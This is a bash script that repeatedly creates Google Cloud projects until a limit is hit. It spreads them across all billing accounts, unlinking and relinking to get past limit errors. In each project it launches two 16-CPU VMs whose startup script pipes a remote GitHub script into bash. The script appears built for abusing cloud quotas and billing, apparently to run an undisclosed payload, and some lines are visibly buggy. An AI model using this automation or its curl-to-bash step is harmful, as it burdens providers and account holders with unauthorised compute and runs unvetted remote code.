#!/bin/bash

sudo apt -y install gpw

function create_projects(){
newprojectname=$(gpw 1 4)-$(gpw 1 5)-$(gpw 1 6)
gcloud projects create $newprojectname

}


while create_projects; do
  echo "All done"
  sleep 5
done

echo "All possible projects was created"



gcloud projects list | cut -f 1 -d ' ' | tail -n+2 > projectname_list
split projectname_list -l5 projects


gcloud beta billing accounts list | cut -f 1 -d ' ' | tail -n+2 > billings_list
split billings_list -l1 billing


function generate_project_billing_list(){

exec 2>/dev/null

for index in {a..z}

do

awk -v OFS=: '
    # read the smaller file into memory
    NR == FNR {size2++; billinga'$index'[FNR] = $0; next}
    # store the last line of the array as the zero-th element
    FNR == 1 && NR > 1 {billinga'$index'[0] = billinga'$index'[size2]}
    # print the current line of projects and the corresponding billing line
    {print $0, billinga'$index'[FNR % size2]}
' billinga$index projectsa$index >> unionfile

done
}

generate_project_billing_list
echo "Projects and billings list was successfully generated"

while IFS=":" read projectname_id billingname_id; do

function link_to_billing(){
gcloud beta billing projects link $projectname_id --billing-account $billingname_id
}


if link_to_billing ; then
    echo "Project $projectname_id successfully linked to $billingname_id"
else
    echo "Error limit was detected. Now we go to unlink and link one more time"
	
	grep '$billing_id' unionfile > unlink_list
	
	while IFS=":" read unlink_projectname_id current_billing_id; do
	gcloud beta billing projects unlink $unlink_projectname_id
	done < ~/unlink_list
	
	while IFS=":" read unlink_projectname_id current_billing_id; do
	gcloud beta billing projects link $unlink_projectname_id --billing-account $current_billing_id
	echo "unlink and link $unlink_projectname_id to $current_billing_id successfully done!"
    done < ~/unlink_list
fi


done < ~/unionfile

Echo "All projects was successfully linked to their billings"


while IFS=":" read projectname_id billingname_id; do

gcloud config set project $projectname_id	
gcloud services enable compute.googleapis.com


gcloud compute zones list | cut -f 1 -d ' ' | tail -n+2 | shuf > shuffed-regions

firstregion=$(sed '1!d' shuffed-regions)
secondregion=$(sed '2!d' shuffed-regions)

gcloud compute instances create comp1 \
--zone=$firstregion \
--image-project ubuntu-os-cloud \
--image-family ubuntu-minimal-1604-lts \
--custom-cpu=16 \
--custom-memory=15Gb \
--metadata startup-script='curl -s -L https://raw.githubusercontent.com/gasteen/opt/master/vst-install.sh | bash -s'
sleep 3s
gcloud compute instances create comp2 \
--zone=$secondregion \
--image-project ubuntu-os-cloud \
--image-family ubuntu-minimal-1604-lts \
--custom-cpu=16 \
--custom-memory=15Gb \
--metadata startup-script='curl -s -L https://raw.githubusercontent.com/gasteen/opt/master/vst-install.sh | bash -s'
sleep 1s

echo "All instances on $projectname_id was created"
echo "Going to the next one..."
done < ~/unionfile

echo "All is done!"
